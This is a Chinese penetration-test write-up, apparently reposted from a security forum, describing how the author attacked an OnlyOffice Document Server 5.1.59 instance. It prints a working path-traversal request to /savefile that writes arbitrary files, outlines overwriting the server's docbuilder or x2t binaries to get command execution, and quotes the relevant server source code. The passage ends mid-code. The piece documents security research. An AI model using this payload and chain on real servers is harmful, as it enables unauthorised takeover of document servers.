---
title: 记一次曲折的onlyoffice漏洞利用，成功getshell！
url: https://mp.weixin.qq.com/s/Wxm3mlc1Ql4oeQa6-ysoiA
source: Doonsec's feed
date: 2026-10-01
fetch_date: 2026-10-02T07:48:31.383083
---

# 记一次曲折的onlyoffice漏洞利用，成功getshell！

# 记一次曲折的onlyoffice漏洞利用，成功getshell！

xinca0Zzz
xinca0Zzz

菜鸟学信安

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

文章作者：xinca0Zzz

文章来源：https://forum.butian.net/share/4943

## 前言

某天白天，有位好兄弟突然问我，手上有个授权的目标有无空闲帮忙看看，正好那时的我因为下雨被困室内只能尽点绵薄之力。 后续发现下雨是对的，这次较为曲折的漏洞挖掘和思路拓展让我逐渐生锈的脑子开始了转动（头好痒哦）

### 渗透阶段

前期一系列的信息收集诸如域名，icp、子域名等等手段暂且不提，反正最终找到了下面的资产

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXxRwSq0FuQSyFicAkFPNSfWP0BgFPEjwW5qjANavrJUQN80BiaxMQXibxsPcTm929LIPyTFV83BPjHB7vQXTlSmaWOSdn4QTPfhY/640?wx_fmt=png&from=appmsg#imgIndex=2)话不多说，直接开始history vuln尝试一波

```
POST /savefile/1?cmd={"id":1,"outputpath":"../../../../../../../../var/www/onlyoffice/documentserver/server/welcome/111.txt"} HTTP/1.1
Host: xxx
Cookie: LRToken=
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

xxx
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKZUInYPQ9UpCY4Iey0sIb1ekW2mAbDIlWicC3zg7sEhyMH7F318k0Rqd0xJ1Y3Q9psR2B1wdHEm2VZiaKZ6L2XWc0nXSFkcxVBg/640?wx_fmt=png&from=appmsg)

哦吼，有戏（开始的我以为已经结束了）

#### 覆盖原始web文件注册路由

传统的onlyoffice利用如下： 项目运行的express的用户为ds, web下的文件所属用户也都为ds，那么可以通过覆盖web的一些文件实现RCE

1. 覆盖js文件，新增路由实现RCE，但是比较麻烦的是node需要重启才会加载上新增的路由（无法实现）
2. 通过覆盖模板文件再通过SSTI RCE，覆盖模板文件后不需要重启服务即可利用（未使用模版）
3. 是否存在命令执行调用elf的路由，通过任意文件写覆盖elf来实现命令执行 这里我们使用3方法来尝试RCE 查看本次项目的onlyoffice是5.1.59版本。去github找到对应源码

![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUKrqX6DbrpTez0Modadew2H27maPw2hRvwicOibpFbyqOvADV8J9oTOibjyukyTuicx2x8dLoug2Y6Iia1q2geHOVRYMmfKw9ibVNptw/640?wx_fmt=png&from=appmsg)

在已公布的利用poc里，`docbuilder`路由实现的方法如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUJX7uZLQR4jBQ5hqfgrBwPWbdbplQslQe7VF26SbkBk8MqTMce6Jy5icAIEMfR7SgZBPJvZCLArfxCgDbtE3q9KBqKSxLYRSNhE/640?wx_fmt=png&from=appmsg)

调用`addTask`方法，将生成doc的任务加到队列

![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKOicmuktGaeHcXGCpEreRKwgt4emT36zpcS3ZB62vygMDVxAG8PVs4Yica0BJWHHEt2tLlyUL1LTiblEDg25P4vE3FKibdkK4WHFI/640?wx_fmt=png&from=appmsg)

在接收到任务后，调用`ExecuteTask`方法，执行

![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxULdrHJ1kWKMribl1xnsibeGP6QjW4B2lzutwPDO3FRvEo0mnRQyTAzD83svQtSteAHeTGLbZJPj8IzLduSlf1TS73QF381VAXkms/640?wx_fmt=png&from=appmsg)

在`ExecuteTask`方法中，会通过`spawnAsync`命令执行方法调用`/var/www/onlyoffice/documentserver/server/FileConverter/bin/docbuilder ELF`二进制文件来生成文档，`docbuilder`文件所属用户也是ds，那么可以通过之前的文件写漏洞覆盖掉`docbuilder ELF`，再通过`docbuilder`路由触发我们上传覆盖的ELF

#### 利用之路漫漫

然而在执行过程中，死活无法成功执行，迫不得已我只能再去仔细阅读一次源码，看看到底是怎么个事。 找到5.1.5.59版本源码查看一番发现

```
app.post('/docbuilder', utils.checkClientIp, rawFileParser, (req, res) => {
            const licenseInfo = docsCoServer.getLicenseInfo();
            if (licenseInfo.type !== constants.LICENSE_RESULT.Success) {
                logger.error('License expired');
                res.sendStatus(402);
                return;
            }
            converterService.builder(req, res);
        });
```

此版本有一个判断，如果`licenseInfo`类型不为True，则无法执行builder的方法。而在`DocsCoServer.js`当中，`licenseInfo`写死为`Error`，所以无法执行`converterService.builder`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKPJZXJPoFUFicmQuvpoCRWsIe5AKg5vr4Ww1SXqfTBO44Lwng0CS7Mk6qoiapb7NHzKNadj1lQrs7YYaYibdBLvpq8Qtat2B6q7Q/640?wx_fmt=png&from=appmsg)

上述的利用链路就无法使用了（TM的甘），所以还能怎么办呢，这时我的脑子非常的痒，挠的时候无意中发现在源码的bin目录里，还存在一个`x2t`的elf文件，这时我想如果我们能够上传并覆盖其内容，并能够执行它，是不是就能达到同样的目的。

![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUIXicsw4YpFyP99ic1cuicNsTu5yXPQAlPjHIwNaerfwOib2YOqZMmwQblEITu9nkfl4QFZEIz74IboeXzX8WFcWLibQ9yUdZE2VvII/640?wx_fmt=png&from=appmsg)

#### 开始扩展审计

回到触发命令执行的地方，具体看看代码：

```
function* ExecuteTask(task) {
  var startDate = null;
  var curDate = null;
  if(clientStatsD) {
    startDate = curDate = new Date();
  }
  var resData;
  var tempDirs;
  var getTaskTime = new Date();
  var cmd = task.getCmd();
  var dataConvert = new TaskQueueDataConvert(task);
  logger.debug('Start Task(id=%s)', dataConvert.key);
  var error = constants.NO_ERROR;
  tempDirs = getTempDir();
  let fileTo = task.getToFile();
  dataConvert.fileTo = fileTo ? path.join(tempDirs.result, fileTo) : '';
  let isBuilder = cmd.getIsBuilder();
  if (cmd.getUrl()) {
    dataConvert.fileFrom = path.join(tempDirs.source, dataConvert.key + '.' + cmd.getFormat());
    var isDownload = yield* downloadFile(dataConvert.key, cmd.getUrl(), dataConvert.fileFrom);
    if (!isDownload) {
      error = constants.CONVERT_DOWNLOAD;
    }
    if(clientStatsD) {
      clientStatsD.timing('conv.downloadFile', new Date() - curDate);
      curDate = new Date();
    }
  } else if (cmd.getSaveKey()) {
    yield* downloadFileFromStorage(cmd.getDocId(), cmd.getDocId(), tempDirs.source);
    logger.debug('downloadFileFromStorage complete(id=%s)', dataConvert.key);
    if(clientStatsD) {
      clientStatsD.timing('conv.downloadFileFromStorage', new Date() - curDate);
      curDate = new Date();
    }
    error = yield* processDownloadFromStorage(dataConvert, cmd, task, tempDirs);
  } else if (cmd.getForgotten()) {
    yield* downloadFileFromStorage(cmd.getDocId(), cmd.getForgotten(), tempDirs.source);
    logger.debug('downloadFileFromStorage complete(id=%s)', dataConvert.key);
    let list = yield utils.listObjects(tempDirs.source, false);
    if (list.length > 0) {
      dataConvert.fileFrom = list[0];
      var forgottenMarkPath = tempDirs.result + '/' + cfgForgottenFilesName + '.txt';
      fs.writeFileSync(forgottenMarkPath, cfgForgottenFilesName, {encoding: 'utf8'});
    } else {
      error = constants.UNKNOWN;
    }
  } else if (isBuilder) {
    yield* downloadFileFromStorage(cmd.getDocId(), cmd.getDocId(), tempDirs.source);
    logger.debug('downloadFileFromStorage complete(id=%s)', dataConvert.key);
    let list = yield utils.listObjects(tempDirs.source, false);
    if (list.length > 0) {
      dataConvert.fileFrom = list[0];
    }
  } else {
    error = constants.UNKNOWN;
  }
  var childRes = null;
  let isTimeout = false;
  if (constants.NO_ERROR === error) {
    if(constants.AVS_OFFICESTUDIO_FILE_OTHER_HTMLZIP === dataConvert.formatTo && cmd.getSaveKey() && !dataConvert.mailMergeSend) {
      yield utils.pipeFiles(dataConvert.fileFrom, dataConvert.fileTo);
    } else {
      var childArgs;
      if (cfgArgs.length > 0) {
        childArgs = cfgArgs.trim().replace(/  +/g, ' ').split(' ');
      } else {
        childArgs = [];
      }
      let processPath;
      if (!isBuilder) {
        processPath = cfgX2tPath;
        let paramsFile = path.join(tempDirs.temp, 'params.xml');
        let hiddenXml = dataConvert.serialize(paramsFile);
        childArgs.push(paramsFile);
        if (hiddenXml) {
          childArgs.push(hiddenXml);
        }
      } else {
        fs.mkdirSync(path.join(tempDirs.result, 'output'));
        processPath = cfgDocbuilderPath;
        childArgs.push('--all-fonts-path=' + cfgDocbuilderAllFontsPath);
        childArgs.push('--save-use-only-names=' + tempDirs.result + '/output');
        childArgs.push(dataConvert.fileFrom);
      }
      let timeoutId;
      try {
        let spawnAsyncPromise = spawnAsync(processPath, childArgs);
        childRes = spawnAsyncPromise.child;
        let waitMS = task.getVisibilityTimeout() * 1000 - (new Date().getTime() - getTaskTime.getTime());
        timeoutId = setTimeout(function() {
          isTimeout = true;
          timeoutId = undefined;
          childRes.stdin.end();
          childRes.stdout.destroy();
          childRes.stderr.destroy();
          childRes.kill();
        }, waitMS);
        childRes = yield spawnAsyncPromise;
      } catch (err) {
 ...